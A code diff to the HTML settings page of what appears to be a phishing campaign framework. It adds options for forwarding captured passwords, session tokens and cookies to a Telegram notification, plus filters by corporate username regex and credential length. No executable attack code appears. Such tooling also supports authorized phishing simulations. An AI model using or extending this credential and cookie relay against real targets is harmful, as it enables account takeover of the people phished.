@@ -85,7 +85,7 @@
 
                     <label class="control-label">Include in Submitted Data messages <i class="fa fa-question-circle"
                             data-toggle="tooltip" data-placement="right"
-                            title="When a target submits data, optionally include the captured credentials in the Telegram message."></i>:</label>
+                            title="When a target submits data, optionally include the captured credentials in the Telegram message. A notification is only sent when at least credentials (username+password) or tokens are captured."></i>:</label>
                     <div class="form-group">
                         <div class="checkbox checkbox-primary" style="margin:0">
                             <input type="checkbox" id="telegram_include_username" value="true" />
@@ -95,6 +95,26 @@
                             <input type="checkbox" id="telegram_include_password" value="true" />
                             <label for="telegram_include_password">Include password</label>
                         </div>
+                        <div class="checkbox checkbox-primary" style="margin:0">
+                            <input type="checkbox" id="telegram_include_tokens" value="true" />
+                            <label for="telegram_include_tokens">Include tokens / cookies</label>
+                        </div>
+                    </div>
+
+                    <label class="control-label">Validation filters <i class="fa fa-question-circle"
+                            data-toggle="tooltip" data-placement="right"
+                            title="Filter notifications: only send when the captured data meets these criteria. Leave username pattern empty to accept all. Set minimum lengths to 0 for no minimum."></i>:</label>
+                    <div class="form-group">
+                        <label for="telegram_username_pattern" style="font-weight:normal">Username pattern (regex)</label>
+                        <input type="text" class="form-control" placeholder="e.g. @corp\.com$ (leave empty for all)" id="telegram_username_pattern" />
+                    </div>
+                    <div class="form-group">
+                        <label for="telegram_min_password_length" style="font-weight:normal">Min password length</label>
+                        <input type="number" min="0" class="form-control" placeholder="0 = no minimum" id="telegram_min_password_length" value="0" />
+                    </div>
+                    <div class="form-group">
+                        <label for="telegram_min_token_length" style="font-weight:normal">Min token/cookie length</label>
+                        <input type="number" min="0" class="form-control" placeholder="0 = no minimum" id="telegram_min_token_length" value="0" />
                     </div>
                 </div>
 
